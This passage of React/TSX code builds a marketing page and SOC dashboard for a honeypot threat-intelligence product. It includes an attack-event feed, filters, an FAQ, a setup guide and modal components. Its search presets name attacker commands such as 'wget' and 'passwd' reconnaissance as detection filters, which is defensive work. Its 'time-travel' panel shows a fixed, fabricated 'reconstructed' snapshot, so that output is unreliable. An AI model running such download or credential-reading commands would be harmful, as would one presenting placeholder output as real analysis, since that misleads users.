                    if (isFeedPaused) setPausedNewCount(0);
                    showToast(isFeedPaused ? "Stream resumed" : "Stream paused");
                  }}
                  className={`px-3 py-1.5 rounded-xl font-bold flex items-center gap-1.5 transition text-[11px] ${isFeedPaused ? 'bg-amber-500 text-black shadow-lg shadow-amber-500/20' : 'bg-[#00d2ff]/20 text-[#00d2ff] border border-[#00d2ff]/40 hover:bg-[#00d2ff] hover:text-black'
                    }`}
                >
                  {isFeedPaused ? <Play className="w-3.5 h-3.5 fill-current" /> : <Pause className="w-3.5 h-3.5 fill-current" />}
                  <span>{isFeedPaused ? 'RESUME STREAM' : 'PAUSE'}</span>
                </button>

                {isFeedPaused && pausedNewCount > 0 && (
                  <span
                    onClick={() => { setIsFeedPaused(false); setPausedNewCount(0); }}
                    className="px-2.5 py-1 rounded-lg bg-red-500/20 text-red-400 border border-red-500/40 text-[10px] font-bold cursor-pointer animate-pulse"
                  >
                    +{pausedNewCount} Pending
                  </span>
                )}
              </div>
            </div>

            {/* Feature 2 & 8: Attack Timeline Scrubber & Time-Travel Debugging */}
            <div className="bg-[#030718] p-3.5 rounded-2xl border border-slate-800/80 mb-5 font-mono text-xs space-y-2.5">
              <div className="flex items-center justify-between text-[11px]">
                <span className="text-slate-400 font-bold flex items-center gap-1.5">
                  <Activity className="w-3.5 h-3.5 text-[#00d2ff]" />
                  Attack Timeline & Time Machine:
                </span>

                {/* Feature 8: Time-Travel Preset Scrubber Buttons */}
                <div className="flex items-center gap-1.5">
                  {(['live', '1h', '1d', '1w'] as const).map(preset => (
                    <button
                      key={preset}
                      onClick={() => {
                        setTimeTravelPreset(preset);
                        if (preset === 'live') {
                          setTimelineMinutes(0);
                          showToast("Time-Travel: Resumed Live Stream");
                        } else if (preset === '1h') {
                          setTimelineMinutes(60);
                          showToast("Time-Travel: Rewound state to 1 Hour Ago");
                        } else if (preset === '1d') {
                          setTimelineMinutes(60);
                          showToast("Time-Travel: Rewound state to 1 Day Ago");
                        } else {
                          setTimelineMinutes(60);
                          showToast("Time-Travel: Rewound state to 1 Week Ago");
                        }
                      }}
                      className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase transition ${timeTravelPreset === preset
                        ? 'bg-[#00d2ff] text-black shadow'
                        : 'bg-slate-900 text-slate-400 hover:text-white'
                        }`}
                    >
                      {preset === 'live' ? 'Live' : `-${preset.toUpperCase()}`}
                    </button>
                  ))}
                </div>
              </div>

              <input
                type="range"
                min="0"
                max="60"
                step="15"
                value={timelineMinutes}
                onChange={e => {
                  const val = Number(e.target.value);
                  setTimelineMinutes(val);
                  if (val === 0) setTimeTravelPreset('live');
                  else setTimeTravelPreset('1h');
                  showToast(val === 0 ? "Viewing Live Stream" : `Viewing historical window -${val}m`);
                }}
                className="w-full accent-[#00d2ff] cursor-pointer"
              />

              <div className="flex justify-between text-[10px] text-slate-500">
                <span className={timelineMinutes === 0 ? 'text-[#00d2ff] font-bold' : ''}>Now (Live)</span>
                <span className={timelineMinutes === 15 ? 'text-[#00d2ff] font-bold' : ''}>-15 min</span>
                <span className={timelineMinutes === 30 ? 'text-[#00d2ff] font-bold' : ''}>-30 min</span>
                <span className={timelineMinutes === 45 ? 'text-[#00d2ff] font-bold' : ''}>-45 min</span>
                <span className={timelineMinutes === 60 ? 'text-[#00d2ff] font-bold' : ''}>-60 min</span>
              </div>

              {/* Feature 8: Time-Travel Debugging Diff View */}
              {timeTravelPreset !== 'live' && (
                <div className="p-2.5 rounded-xl bg-purple-950/30 border border-purple-500/40 text-[11px] text-purple-200 flex items-center justify-between">
                  <span>
                    <strong>Reconstructed Snapshot ({timeTravelPreset.toUpperCase()} Ago):</strong> 3 new IPs added · Port 443 closed · Host Behavior Score dropped -32 pts
                  </span>
                  <span className="text-[10px] text-emerald-400 font-bold">STATE RECONSTRUCTED</span>
                </div>
              )}
            </div>

            {/* Feature 1: Search Box & Syntax Helper Tooltip */}
            <div className="relative mb-5">
              <div className="flex flex-col sm:flex-row items-center gap-3 bg-[#08122c] p-3 rounded-2xl border border-slate-800">
                <div className="relative flex-1 w-full">
                  <Search className="w-3.5 h-3.5 absolute left-3.5 top-3 text-slate-400" />
                  <input
                    ref={searchInputRef}
                    type="text"
                    value={searchQuery}
                    onFocus={() => setIsSearchFocused(true)}
                    onBlur={() => setTimeout(() => setIsSearchFocused(false), 250)}
                    onChange={e => setSearchQuery(e.target.value)}
                    placeholder="Search IP, Command, or type src:185.*, cmd:wget, threat:>80... [/]"
                    className="w-full pl-9 pr-4 py-2 rounded-xl bg-[#030612] border border-slate-700 text-white focus:outline-none focus:border-[#00d2ff] text-xs font-mono"
                  />
                  {searchQuery && (
                    <button onClick={() => setSearchQuery('')} className="absolute right-3 top-2.5 text-slate-400 hover:text-white text-xs">✕</button>
                  )}
                </div>

                <div className="flex items-center gap-1.5 font-mono text-[11px] shrink-0">
                  <span className="text-slate-400 hidden md:inline">Severity:</span>
                  {(['all', 'critical', 'high', 'medium'] as const).map(sev => (
                    <button
                      key={sev}
                      onClick={() => setFilterSeverity(sev)}
                      className={`px-2.5 py-1 rounded-lg uppercase text-[10px] font-bold ${filterSeverity === sev ? 'bg-[#00d2ff] text-black' : 'bg-slate-900 text-slate-400 hover:text-white'
                        }`}
                    >
                      {sev}
                    </button>
                  ))}
                </div>

                <div className="flex items-center gap-1 font-mono text-[11px] shrink-0">
                  <span className="text-slate-400 hidden md:inline">Proto:</span>
                  {(['all', 'SSH', 'Telnet'] as const).map(prot => (
                    <button
                      key={prot}
                      onClick={() => setFilterProtocol(prot)}
                      className={`px-2 py-1 rounded-lg uppercase text-[10px] font-bold ${filterProtocol === prot ? 'bg-indigo-500 text-white' : 'bg-slate-900 text-slate-400 hover:text-white'
                        }`}
                    >
                      {prot}
                    </button>
                  ))}
                </div>
              </div>

              {/* Search Syntax Helper Dropdown (Feature 1) */}
              {isSearchFocused && (
                <div className="absolute top-full left-0 right-0 mt-2 z-30 p-3 rounded-2xl bg-[#04081c] border border-[#00d2ff]/40 shadow-2xl font-mono text-xs space-y-2 animate-in fade-in duration-150">
                  <div className="flex items-center justify-between text-slate-400 text-[11px] border-b border-slate-800 pb-1.5">
                    <span className="font-bold text-white flex items-center gap-1.5">
                      <Terminal className="w-3.5 h-3.5 text-[#00d2ff]" />
                      Supported Search Syntax Operators:
                    </span>
                    <span>Click operator to apply</span>
                  </div>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[10px]">
                    <div
                      onClick={() => setSearchQuery('src:185.')}
                      className="p-2 rounded-lg bg-[#020512] border border-slate-800 hover:border-[#00d2ff] cursor-pointer"
                    >
                      <code className="text-[#00d2ff] block">src:185.*</code>
                      <span className="text-slate-400">Filter Source IP</span>
                    </div>
                    <div
                      onClick={() => setSearchQuery('cmd:wget')}
                      className="p-2 rounded-lg bg-[#020512] border border-slate-800 hover:border-[#00d2ff] cursor-pointer"
                    >
                      <code className="text-[#00d2ff] block">cmd:wget</code>
                      <span className="text-slate-400">Filter Command</span>
                    </div>
                    <div
                      onClick={() => setSearchQuery('threat:>85')}
                      className="p-2 rounded-lg bg-[#020512] border border-slate-800 hover:border-[#00d2ff] cursor-pointer"
                    >
                      <code className="text-[#00d2ff] block">threat:&gt;85</code>
                      <span className="text-slate-400">High Threat Score</span>
                    </div>
                    <div
                      onClick={() => setSearchQuery('passwd')}
                      className="p-2 rounded-lg bg-[#020512] border border-slate-800 hover:border-[#00d2ff] cursor-pointer"
                    >
                      <code className="text-[#00d2ff] block">passwd</code>
                      <span className="text-slate-400">Account Recon</span>
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Telemetry Log List (Adaptive Density: Comfortable vs Compact) */}
            <div className="space-y-2">
              {filteredEvents.length === 0 ? (
                <div className="py-16 text-center space-y-3 bg-[#020510] rounded-2xl border border-slate-800">
                  <AlertCircle className="w-8 h-8 text-amber-400 mx-auto" />
                  <p className="text-sm font-bold text-white">No Attack Events Match Your Filter</p>
                  <p className="text-xs text-slate-400 font-sans">Try resetting search query or selecting "All" severity.</p>
                  <button
                    onClick={() => { setSearchQuery(''); setFilterSeverity('all'); setFilterProtocol('all'); setActiveQuickChip('none'); }}
                    className="px-4 py-2 rounded-xl bg-[#00d2ff]/20 text-[#00d2ff] border border-[#00d2ff]/40 font-mono text-xs font-bold"
                  >
                    Reset Filters
                  </button>
                </div>
              ) : (
                filteredEvents.map((item, idx) => (
                  <div
                    key={item.id}
                    onClick={() => setSelectedInspectEvent(item)}
                    className={`border transition-all duration-200 flex flex-col md:flex-row md:items-center justify-between gap-3 cursor-pointer group hover:border-[#00d2ff] ${density === 'compact' ? 'p-2 rounded-xl text-xs' : 'p-3.5 rounded-2xl text-xs sm:text-sm'
                      } ${idx === liveIndex && !isFeedPaused
                        ? 'bg-[#00d2ff]/10 border-[#00d2ff]/60 text-cyan-100 shadow-[0_0_20px_rgba(0,210,255,0.2)]'
                        : isDarkOps ? 'bg-[#050505] border-neutral-900 text-neutral-300 hover:bg-[#0a0a0a]' : 'bg-[#030612]/80 border-slate-800 text-slate-400 hover:bg-[#08122c]'
                      }`}
                  >
                    {/* Left Badges */}
                    <div className="flex items-center gap-2.5 shrink-0">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase ${item.severity === 'critical' ? 'bg-red-500/20 text-red-400 border border-red-500/40' :
                        item.severity === 'high' ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40' :
                          'bg-cyan-500/20 text-cyan-400 border border-cyan-500/40'
                        }`}>
                        {item.protocol}
                      </span>
                      <span className="text-white font-mono font-bold">{item.ip}</span>
                      <span className="text-slate-500 text-[11px] font-sans">({item.country})</span>
                    </div>

                    {/* Middle: Command */}
                    <div className="truncate text-slate-300 font-mono text-xs bg-[#01040f] px-3 py-1.5 rounded-xl border border-slate-900 flex-1">
                      <span className="text-slate-500">CMD:</span> {item.cmd}
                    </div>

                    {/* Right: Living Threat Score (HBS Gauge) & Details trigger */}
                    <div className="flex items-center justify-between md:justify-end gap-3 shrink-0 font-mono text-xs">
                      {/* Feature 1: The "Living" Threat Score (Dynamic Host Behavior Score - HBS) */}
                      <div
                        className={`relative flex items-center gap-1.5 px-2.5 py-1 rounded-xl border text-[11px] font-bold cursor-help transition ${item.threatScore > 70
                          ? 'bg-red-500/15 border-red-500/40 text-red-400 shadow-[0_0_12px_rgba(239,68,68,0.25)]'
                          : item.threatScore > 35
                            ? 'bg-amber-500/15 border-amber-500/40 text-amber-400 shadow-[0_0_12px_rgba(245,158,11,0.25)]'
                            : 'bg-emerald-500/15 border-emerald-500/40 text-emerald-400 shadow-[0_0_12px_rgba(16,185,129,0.25)]'
                          }`}
                        title={`Living Host Behavior Score (HBS): ${item.threatScore}/100\n• Baseline Learning: 500 req/min (95% 200s)\n• Deviation Penalty: Spike to 5,200 req/min with 404s (+42 pts)\n• Context Multiplier: ${item.asn.includes('Cloudflare') || item.asn.includes('Microsoft') ? '+20% Bad ASN' : '+10%'}\n• Threat Level: ${item.threatScore > 70 ? 'CRITICAL (Immediate SOC Urgency)' : item.threatScore > 35 ? 'ANOMALOUS (Investigation Required)' : 'STABLE'}`}
                      >
                        {/* Pulsing color-shifting indicator orb */}
                        <span className="relative flex h-2 w-2">
                          <span className={`animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 ${item.threatScore > 70 ? 'bg-red-400' : item.threatScore > 35 ? 'bg-amber-400' : 'bg-emerald-400'
                            }`}></span>
                          <span className={`relative inline-flex rounded-full h-2 w-2 ${item.threatScore > 70 ? 'bg-red-500' : item.threatScore > 35 ? 'bg-amber-500' : 'bg-emerald-500'
                            }`}></span>
                        </span>

                        <span>HBS: {item.threatScore}</span>
                      </div>

                      <span className="text-slate-500 text-[11px]">{item.time}</span>

                      {/* Direct Correlation Graph Modal Trigger */}
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          setSelectedGraphEvent(item);
                        }}
                        className="px-2 py-1 rounded-lg bg-purple-500/15 border border-purple-500/35 text-purple-300 hover:bg-purple-500/30 transition flex items-center gap-1 text-[11px]"
                        title="Visualize Attack Correlation Chain"
                      >
                        <Network className="w-3 h-3 text-purple-400" />
                        <span>Graph</span>
                      </button>

                      <span className="text-[#00d2ff] font-bold group-hover:translate-x-1 transition-transform text-xs">
                        Inspect →
                      </span>
                    </div>
                  </div>
                ))
              )}
            </div>

          </div>
        </section>

        {/* Resources & Whitepaper */}
        <section id="resources" className="py-24 px-6 max-w-7xl mx-auto border-t border-slate-800/80 z-10 relative">
          <div className="bg-[#060e26] border border-[#00d2ff]/30 rounded-3xl p-8 sm:p-12 shadow-[0_0_80px_rgba(0,210,255,0.15)] relative overflow-hidden">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 pb-8 border-b border-slate-800">
              <div>
                <div className="inline-flex items-center gap-2 px-3.5 py-1 rounded-full bg-[#00d2ff]/10 border border-[#00d2ff]/30 text-[#00d2ff] text-xs font-mono mb-3">
                  <Cpu className="w-3.5 h-3.5" />
                  <span>CYVANTIS AI ANOMALY PLATFORM</span>
                </div>
                <h2 className="text-3xl sm:text-4xl font-black text-white tracking-tight">
                  CYVANTIS AI Security Services Overview
                </h2>
              </div>

              <button
                onClick={handleDownloadPDF}
                className="px-6 py-3.5 rounded-xl bg-gradient-to-r from-[#00d2ff] to-[#0072ff] hover:from-[#00c0ee] hover:to-[#005cd6] text-white font-mono font-bold text-xs tracking-wider uppercase transition shadow-[0_0_25px_rgba(0,210,255,0.4)] flex items-center justify-center gap-2 shrink-0 hover:scale-105 active:scale-95"
              >
                <Download className="w-4 h-4" />
                <span>Download PDF Whitepaper</span>
              </button>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 pt-8">
              <div className="lg:col-span-7 space-y-4 text-xs text-slate-300 font-sans leading-relaxed">
                <h3 className="text-lg font-bold text-white font-mono">Platform Architecture</h3>
                <p>
                  Traditional signature-based detection misses novel and zero-day threats. <strong>CYVANTIS AI Anomaly Detection platform</strong> leverages deep learning and unsupervised ML to surface hidden threats in real time — detecting deviations in network traffic, user behaviour, and endpoint telemetry before they escalate into breaches.
                </p>
                <p>
                  Unsupervised machine learning algorithms (<strong>Isolation Forest, Autoencoders, DBSCAN</strong>) continuously learn what 'normal' looks like in your environment, dramatically reducing false positives.
                </p>
              </div>

              <div className="lg:col-span-5 bg-[#030612] p-6 rounded-2xl border border-slate-800 space-y-3 font-mono text-xs">
                <h3 className="text-sm font-bold text-[#00d2ff] uppercase tracking-wider flex items-center gap-2 border-b border-slate-800 pb-3">
                  <CheckCircle2 className="w-4 h-4 text-[#00d2ff]" />
                  Included Capabilities
                </h3>
                <ul className="space-y-2 text-[11px] text-slate-300">
                  <li className="flex items-start gap-2"><span className="text-[#00d2ff] font-bold">•</span> Unsupervised ML Anomaly Detection</li>
                  <li className="flex items-start gap-2"><span className="text-[#00d2ff] font-bold">•</span> Behavioural Baseline Modelling</li>
                  <li className="flex items-start gap-2"><span className="text-[#00d2ff] font-bold">•</span> User & Entity Behaviour Analytics (UEBA)</li>
                  <li className="flex items-start gap-2"><span className="text-[#00d2ff] font-bold">•</span> Cowrie SSH & Telnet Decoy Ingestion</li>
                  <li className="flex items-start gap-2"><span className="text-[#00d2ff] font-bold">•</span> SIEM & SOAR Automated Integration</li>
                </ul>
              </div>
            </div>
          </div>
        </section>

        {/* FAQ Accordion */}
        <section id="faq" className="py-24 px-6 max-w-5xl mx-auto border-t border-slate-800/80 z-10 relative">
          <div className="text-center mb-16 space-y-3">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#00d2ff]/10 border border-[#00d2ff]/30 text-[#00d2ff] text-xs font-mono">
              <HelpCircle className="w-3.5 h-3.5" />
              <span>FREQUENTLY ASKED QUESTIONS</span>
            </div>
            <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight">Everything You Need to Know</h2>
          </div>

          <div className="space-y-4 font-sans">
            {faqs.map((faq, idx) => (
              <div
                key={idx}
                className="bg-[#060e26] border border-slate-800 rounded-2xl overflow-hidden transition-all duration-300"
              >
                <button
                  onClick={() => setActiveFaqIndex(activeFaqIndex === idx ? null : idx)}
                  className="w-full p-6 text-left font-bold text-white text-base flex items-center justify-between gap-4 hover:text-[#00d2ff]"
                >
                  <span>{faq.q}</span>
                  <span className="text-xl text-[#00d2ff]">{activeFaqIndex === idx ? '−' : '+'}</span>
                </button>
                {activeFaqIndex === idx && (
                  <div className="px-6 pb-6 text-xs text-slate-300 leading-relaxed font-mono border-t border-slate-800/60 pt-4 bg-[#030612]/50">
                    {faq.a}
                  </div>
                )}
              </div>
            ))}
          </div>
        </section>

        {/* Getting Started Guide */}
        <section id="getting-started" className="py-24 px-6 max-w-7xl mx-auto border-t border-slate-800/80 z-10 relative">
          <div className="text-center max-w-3xl mx-auto mb-16">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#00d2ff]/10 border border-[#00d2ff]/30 text-[#00d2ff] text-xs font-mono mb-3">
              <Sparkles className="w-3.5 h-3.5" />
              <span>DEPLOYMENT ONBOARDING</span>
            </div>
            <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight">Quick 3-Step Setup Guide</h2>
            <p className="text-slate-400 text-sm mt-3 font-sans max-w-xl mx-auto">
              Get your CYVANTIS threat intelligence instance running in under 2 minutes.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="bg-[#060e26] p-7 rounded-2xl border border-slate-800 relative shadow-xl hover:border-[#00d2ff]/40 transition group hover:-translate-y-1">
              <div className="w-10 h-10 rounded-xl bg-[#00d2ff]/10 border border-[#00d2ff]/30 font-mono font-bold text-[#00d2ff] flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
                01
              </div>
              <h4 className="text-xl font-bold text-white mb-2">FastAPI Backend</h4>
              <p className="text-xs text-slate-400 font-sans mb-4 leading-relaxed">
                Launch FastAPI backend server on port 8000. SQLite database is automatically seeded.
              </p>
              <div className="bg-[#030612] p-3 rounded-xl border border-slate-800 font-mono text-[11px] text-[#00d2ff] overflow-x-auto">
                <code>uvicorn app.main:app --reload</code>
              </div>
            </div>

            <div className="bg-[#060e26] p-7 rounded-2xl border border-slate-800 relative shadow-xl hover:border-blue-500/40 transition group hover:-translate-y-1">
              <div className="w-10 h-10 rounded-xl bg-blue-500/10 border border-blue-500/30 font-mono font-bold text-blue-400 flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
                02
              </div>
              <h4 className="text-xl font-bold text-white mb-2">React Frontend</h4>
              <p className="text-xs text-slate-400 font-sans mb-4 leading-relaxed">
                Start Vite dev server on port 5173 to access the real-time SOC Control Panel interface.
              </p>
              <div className="bg-[#030612] p-3 rounded-xl border border-slate-800 font-mono text-[11px] text-blue-300 overflow-x-auto">
                <code>cd frontend && npm run dev</code>
              </div>
            </div>

            <div className="bg-[#060e26] p-7 rounded-2xl border border-slate-800 relative shadow-xl hover:border-teal-500/40 transition group hover:-translate-y-1">
              <div className="w-10 h-10 rounded-xl bg-teal-500/10 border border-teal-500/30 font-mono font-bold text-teal-400 flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
                03
              </div>
              <h4 className="text-xl font-bold text-white mb-2">Authenticate</h4>
              <p className="text-xs text-slate-400 font-sans mb-4 leading-relaxed">
                Log in with default admin credentials and complete the mandatory 2FA TOTP setup.
              </p>
              <button
                onClick={onLoginClick}
                className="w-full py-3 bg-gradient-to-r from-[#00d2ff] to-[#0072ff] hover:from-[#00c0ee] hover:to-[#005cd6] text-white font-mono font-bold text-xs rounded-xl transition shadow-lg shadow-[#00d2ff]/20 hover:scale-105 active:scale-95 flex items-center justify-center gap-2"
              >
                <span>Sign In to Console</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="border-t border-slate-800/80 py-12 px-6 text-xs text-slate-500 font-mono z-10 relative bg-[#020510]">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6">
          <div className="flex flex-col sm:flex-row items-center gap-3">
            <div className="flex items-center gap-2">
              <Shield className="w-4 h-4 text-[#00d2ff]" />
              <span className="font-bold text-slate-300">CYVANTIS GATEWAY</span>
              <span>— Threat Intelligence Nexus</span>
            </div>
            <span className="hidden sm:inline text-slate-700">|</span>
            <a href="mailto:support@cyvantis.tech" className="text-[#00d2ff] hover:underline">
              support@cyvantis.tech
            </a>
          </div>

          <div className="flex items-center gap-4">
            <button onClick={onLoginClick} className="text-slate-300 hover:text-[#00d2ff]">
              Log in
            </button>
            <button
              onClick={() => setIsDemoModalOpen(true)}
              className="px-4 py-2 rounded-lg bg-[#00d2ff]/10 border border-[#00d2ff]/40 text-[#00d2ff] font-bold hover:bg-[#00d2ff] hover:text-black transition"
            >
              Request Demo
            </button>
          </div>
        </div>
      </footer>

      {/* Back-to-Top Button (Angular Squircle) */}
      {showBackToTop && (
        <button
          onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
          className="fixed bottom-6 right-6 z-40 p-3.5 rounded-xl bg-[#C8F904] text-[#0E1A1F] font-bold shadow-[0_4px_25px_rgba(200,249,4,0.4)] hover:bg-[#D8FF1E] transition-all duration-200 border border-white hover:scale-105 active:scale-95"
          aria-label="Back to top"
        >
          <ArrowUp className="w-5 h-5" />
        </button>
      )}

      {/* ------------------------------------------------------------- */}
      {/* MODALS & DRAWERS (INTEGRATED COMPONENTS)                      */}
      {/* ------------------------------------------------------------- */}

      {/* Feature 3: Command Palette (Ctrl + K) */}
      <CommandPalette
        isOpen={isCommandPaletteOpen}
        onClose={() => setIsCommandPaletteOpen(false)}
        commands={commandPaletteItems}
      />

      {/* Feature 5: Split-View Log Inspector */}
      <SplitViewInspector
        event={selectedInspectEvent}
        onClose={() => setSelectedInspectEvent(null)}
        onCopyToast={showToast}
        onOpenGraph={(ev) => {
          setSelectedInspectEvent(null);
          setSelectedGraphEvent(ev);
        }}
      />

      {/* Feature: Interactive Attack Correlation Graph Modal (Neo4j) */}
      <AttackCorrelationGraphModal
        event={selectedGraphEvent}
        onClose={() => setSelectedGraphEvent(null)}
        onCopyToast={showToast}
      />

      {/* Feature: Scope Validation & Guardrails Pentest Suite (Living Lab) */}
      <ScopeGuardrailsPentestModal
        isOpen={isPentestGuardrailsOpen}
        onClose={() => setIsPentestGuardrailsOpen(false)}
        onCopyToast={showToast}
      />

      {/* Feature: Advanced Pentesting & Active Deception Nexus */}
      <AdvancedPentestSuiteModal
        isOpen={isAdvancedPentestOpen}
        onClose={() => setIsAdvancedPentestOpen(false)}
        onCopyToast={showToast}
      />

      {/* Feature 10: Threat Score Leaderboard & Security Scorecard */}
      <SecurityScorecardModal
        isOpen={isScorecardOpen}
        onClose={() => setIsScorecardOpen(false)}
        onCopyToast={showToast}
      />

      {/* Domain & DNS Intelligence Suite (PDNS, DNSSEC, CT, WHOIS) */}
      <DomainIntelligenceModal
        isOpen={isDomainIntelOpen}
        onClose={() => setIsDomainIntelOpen(false)}
        onCopyToast={showToast}
      />

      {/* Cyber War Room & Offensive-Defensive Suite */}
      <CyberWarRoomModal
        isOpen={isCyberWarRoomOpen}
        onClose={() => setIsCyberWarRoomOpen(false)}
        onCopyToast={showToast}
      />

      {/* Feature 7: Notification Center Hub */}
      <NotificationCenter
        isOpen={isNotificationCenterOpen}
        onClose={() => setIsNotificationCenterOpen(false)}
        onOpenRuleBuilder={() => setIsAlertRuleBuilderOpen(true)}
      />

      {/* Feature 9: Data Export Wizard */}
      <ExportWizardModal
        isOpen={isExportWizardOpen}
        onClose={() => setIsExportWizardOpen(false)}
        events={filteredEvents}
        onToast={showToast}
      />

      {/* Feature 8: Onboarding Tour */}
      <OnboardingTour
        isOpen={isOnboardingTourOpen}
        onClose={() => setIsOnboardingTourOpen(false)}
      />

      {/* Feature 9: API Key Manager */}
      <ApiKeyManagerModal
        isOpen={isApiKeyManagerOpen}
        onClose={() => setIsApiKeyManagerOpen(false)}
        onToast={showToast}
      />

      {/* Feature 7: Alert Rule Builder */}
      <AlertRuleBuilderModal
        isOpen={isAlertRuleBuilderOpen}
        onClose={() => setIsAlertRuleBuilderOpen(false)}
        onToast={showToast}
      />

      {/* Demo Request Registration Modal */}
      {isDemoModalOpen && (
        <div
          role="dialog"
          aria-modal="true"
          aria-label="Request a Live Demo"
          className="fixed inset-0 z-[180] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 font-sans"
        >
          <div className="bg-[#060e26] border border-[#00d2ff]/40 rounded-3xl p-6 sm:p-8 max-w-lg w-full shadow-[0_0_60px_rgba(0,210,255,0.3)] space-y-6 relative overflow-hidden">
            <button
              onClick={() => setIsDemoModalOpen(false)}
              className="absolute top-5 right-5 text-slate-400 hover:text-white text-xl font-bold"
            >
              ✕
            </button>

            {demoSubmitted ? (
              <div className="py-6 text-center space-y-4 font-mono">
                <div className="w-16 h-16 rounded-full bg-emerald-500/20 border-2 border-emerald-400 text-emerald-400 flex items-center justify-center mx-auto animate-bounce">
                  <CheckCircle2 className="w-8 h-8" />
                </div>
                <h3 className="text-xl font-bold text-white">Demo Scheduled!</h3>
                <p className="text-xs text-slate-300 font-sans max-w-xs mx-auto">
                  Confirmed for <strong className="text-[#00d2ff]">{demoDate} at {demoTime}</strong>. Link sent to <strong className="text-white">{demoForm.email}</strong>.
                </p>
              </div>
            ) : (
              <>
                <div className="space-y-2">
                  <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#00d2ff]/10 border border-[#00d2ff]/30 text-[#00d2ff] text-xs font-mono">
                    <Sparkles className="w-3.5 h-3.5" />
                    <span>30-MIN FOCUSED SESSION</span>
                  </div>
                  <h3 className="text-2xl font-black text-white">Request a Live Demo</h3>
                </div>

                <form onSubmit={handleDemoSubmit} className="space-y-4 font-mono text-xs">
                  <input type="text" name="hp_website" value={demoForm.hp_website} onChange={e => setDemoForm({ ...demoForm, hp_website: e.target.value })} className="hidden" />

                  <div className="space-y-2">
                    <label className="block text-slate-300">Select Date & Time Slot</label>
                    <div className="flex gap-2 overflow-x-auto pb-1">
                      {['Today', 'Tomorrow', 'Oct 13', 'Oct 14'].map(d => (
                        <button
                          key={d}
                          type="button"
                          onClick={() => setDemoDate(d)}
                          className={`px-3 py-1.5 rounded-lg border text-[11px] shrink-0 ${demoDate === d ? 'bg-[#00d2ff] text-black font-bold border-[#00d2ff]' : 'bg-[#030612] text-slate-400 border-slate-800'
                            }`}
                        >
                          {d}
                        </button>
                      ))}
                    </div>
                    <div className="flex gap-2 overflow-x-auto">
                      {['10:00 AM EST', '02:00 PM EST', '05:30 PM IST'].map(t => (
                        <button
                          key={t}
                          type="button"
                          onClick={() => setDemoTime(t)}
                          className={`px-3 py-1.5 rounded-lg border text-[11px] shrink-0 ${demoTime === t ? 'bg-[#00d2ff] text-black font-bold border-[#00d2ff]' : 'bg-[#030612] text-slate-400 border-slate-800'
                            }`}
                        >
                          {t}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div>
                    <label className="block text-slate-300 mb-1">Full Name *</label>
                    <input
                      type="text"
                      autoComplete="name"
                      placeholder="Alex Mercer"
                      value={demoForm.name}
                      onChange={e => setDemoForm({ ...demoForm, name: e.target.value })}
                      className={`w-full px-4 py-2.5 rounded-xl bg-[#030612] border text-white focus:outline-none ${demoErrors.name ? 'border-red-500' : 'border-slate-800 focus:border-[#00d2ff]'
                        }`}
                    />
                    {demoErrors.name && <p className="text-red-400 text-[10px] mt-1 font-sans">{demoErrors.name}</p>}
                  </div>

                  <div>
                    <label className="block text-slate-300 mb-1">Work Email *</label>
                    <input
                      type="email"
                      autoComplete="email"
                      placeholder="alex@enterprise.com"
                      value={demoForm.email}
                      onChange={e => setDemoForm({ ...demoForm, email: e.target.value })}
                      className={`w-full px-4 py-2.5 rounded-xl bg-[#030612] border text-white focus:outline-none ${demoErrors.email ? 'border-red-500' : 'border-slate-800 focus:border-[#00d2ff]'
                        }`}
                    />
                    {demoErrors.email && <p className="text-red-400 text-[10px] mt-1 font-sans">{demoErrors.email}</p>}
                  </div>

                  <div className="pt-2">
                    <button
                      type="submit"
                      disabled={isSubmittingDemo}
                      className="w-full py-3.5 bg-gradient-to-r from-[#00d2ff] to-[#0072ff] hover:from-[#00c0ee] hover:to-[#005cd6] text-white font-bold text-xs tracking-wider uppercase rounded-xl transition shadow-lg shadow-[#00d2ff]/30 flex items-center justify-center gap-2"
                    >
                      {isSubmittingDemo ? <span>Booking Slot...</span> : <span>Confirm Free Demo</span>}
                    </button>
                  </div>
                </form>
              </>
            )}
          </div>
        </div>
      )}

      {/* Technical Documentation Service Modal */}
      {selectedServiceId && serviceDetails[selectedServiceId] && (
        <div
          role="dialog"
          aria-modal="true"
          aria-label={serviceDetails[selectedServiceId].title}
          className="fixed inset-0 z-[150] bg-black/85 backdrop-blur-md flex items-center justify-center p-4 font-sans"
        >
          <div className="bg-[#060e26] border border-[#00d2ff]/40 rounded-3xl p-6 sm:p-8 max-w-2xl w-full shadow-[0_0_80px_rgba(0,210,255,0.25)] space-y-6 relative overflow-hidden max-h-[90vh] overflow-y-auto">
            <button
              onClick={() => setSelectedServiceId(null)}
              className="absolute top-5 right-5 text-slate-400 hover:text-white text-xl font-bold"
            >
              ✕
            </button>

            <div className="flex items-center gap-3">
              <div className="p-3 rounded-2xl bg-[#030612] border border-slate-800">
                {serviceDetails[selectedServiceId].icon}
              </div>
              <div>
                <span className="text-[10px] font-mono text-[#00d2ff] tracking-widest uppercase font-bold">
                  {serviceDetails[selectedServiceId].category}
                </span>
                <h3 className="text-2xl font-black text-white">
                  {serviceDetails[selectedServiceId].title}
                </h3>
              </div>
            </div>

